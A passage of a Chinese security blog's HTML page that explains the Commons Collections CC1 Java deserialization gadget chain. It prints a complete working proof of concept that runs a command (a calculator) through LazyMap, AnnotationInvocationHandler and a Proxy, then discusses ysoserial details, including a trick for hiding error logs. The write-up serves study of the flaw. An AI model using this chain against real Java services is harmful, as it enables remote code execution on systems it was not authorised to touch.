class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/6/10 23:00</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// ysoserial</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1Yso</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-comment">//将transformers数组存入ChaniedTransformer这个继承类</span><br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        <br>        <span class="hljs-comment">// 不用再添加value了</span><br>        <span class="hljs-comment">// innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br>        <span class="hljs-comment">//使用 LazyMap</span><br>        Map outerMap = LazyMap.decorate(innerMap,transformerChain);<br><br>        <span class="hljs-comment">// 通过反射机制 实例化 AnnotationInvocationHandler</span><br>        Class cl = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br>        <span class="hljs-comment">//取消构造函数修饰符限制</span><br>        ctor.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">//获取AnnotationInvocationHandler类实例</span><br>        Object instance = ctor.newInstance(Target.class, outerMap);<br><br>        <span class="hljs-comment">// 动态代理劫持 （Proxy 实现了Serializable接口 是可以序列化的）</span><br>        InvocationHandler handler = (InvocationHandler) instance;<br>        Map proxyMap = (Map) Proxy.newProxyInstance(<br>                Map.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;,<br>                handler<br>        );<br><br>        Object proxy =  ctor.newInstance(Target.class, proxyMap);<br><br>        <span class="hljs-comment">//payload序列化写入文件，模拟网络传输</span><br>        FileOutputStream f = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payloadproxy.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> ObjectOutputStream(f);<br>        fout.writeObject(proxy);<br><br>        <span class="hljs-comment">//2.服务端读取文件，反序列化，模拟网络传输</span><br>        FileInputStream fi = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payloadproxy.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> ObjectInputStream(fi);<br>        <span class="hljs-comment">//服务端反序列化</span><br>        fin.readObject();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>成功执行命令<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110313.png" srcset="/img/loading.gif" lazyload alt="image-20210611095342352"></p>
+<h3 id="5-4-其它"><a href="#5-4-其它" class="headerlink" title="5.4 其它"></a>5.4 其它</h3><p>有时候调试上述POC的时候，会发现弹出了两个计算器，或者没有执行到readObject的时候就弹出了计算器，这是由于IDEA中Debug就利用toString，在过程中会调用代理类的toString方法从而造成非预期的命令执行(在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，)<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110259.png" srcset="/img/loading.gif" lazyload alt="image-20210611100555230"></p>
+<p>ysoserial中对此也有一些处理，它在POC的最后才将执行命令的Transformer数组设置到transformerChain 中</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers); <span class="hljs-comment">// arm with actual transformer chain</span><br></code></pre></div></td></tr></table></figure>
+
+<p>还有ysoserial在transform数组中多了一个元素<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110254.png" srcset="/img/loading.gif" lazyload alt="image-20210611102209671"></p>
+<p>P牛猜测是为了隐藏报错信息，在上述执行命令成功后，可以看到有一条报错信息，再加入这个元素后，隐蔽了启动进程的日志特征<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210611110306.png" srcset="/img/loading.gif" lazyload alt="image-20210611102415982"></p>
+<p>经过测试，<strong>LazyMap</strong>与<strong>TransformedMap</strong>都不能在高版本Java（8u71）之后利用，至于如何解决那是另一条CommonCollections利用链的学习了（CommonCollections6）。</p>
+<p>上述分析过程用到的代码都已上传到 <a target="_blank" rel="noopener" href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
+<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a target="_blank" rel="noopener" href="https://www.gettoby.com/p/0h2v47vgjznb">https://www.gettoby.com/p/0h2v47vgjznb</a></p>
+<p>P牛知识星球-java安全漫谈</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/">
+                        <span class="hidden-mobile">Java ysoserial学习之URLDNS(一)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.lazyComments('valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#valine",
+          app_id: "vID2hnAAj71HlTtLcwO4InbY-gzGzoHsz",
+          app_key: "GB9a9tvf5zPbYaxUShE01qk1",
+          placeholder: "说点什么",
+          path: window.location.pathname,
+          avatar: "robohash",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "https://vid2hnaa.lc-cn-n1-shared.com",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-x-md">
+    <div class="container custom post-custom mx-auto">
+      <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210320180703.jpg" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/yhy0" target="_blank" rel="nofollow noopener"><span>YHY</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
